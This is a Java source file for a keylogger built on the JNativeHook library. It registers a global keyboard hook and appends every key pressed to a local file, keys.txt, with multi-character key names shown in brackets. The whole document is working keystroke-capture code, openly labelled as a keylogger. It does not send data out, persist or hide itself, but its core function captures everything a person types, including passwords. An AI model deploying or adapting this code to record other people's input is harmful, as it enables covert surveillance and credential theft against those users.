package me.dhvakr;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Program to run the keylogger application with NativeHook library
 *
 * @author dhvakr
 */
public class KeyLogger implements NativeKeyListener {

	private static final Path file = Paths.get("keys.txt");
	private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);

	public static void main(String[] args) {

		logger.info("Key logger has been started");

		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			logger.error(e.getMessage(), e);
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}

	private static void init() {
		
		// Get the logger for "org.jnativehook" and set the level to warning.
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);

		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);
	}


	public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
			
			if (keyText.length() > 1) {
				writer.print("[" + keyText + "]");
			} else {
				writer.print(keyText);
			}
			
		} catch (IOException ex) {
			logger.error(ex.getMessage(), ex);
			System.exit(-1);
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// Nothing
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// Nothing here
	}
}
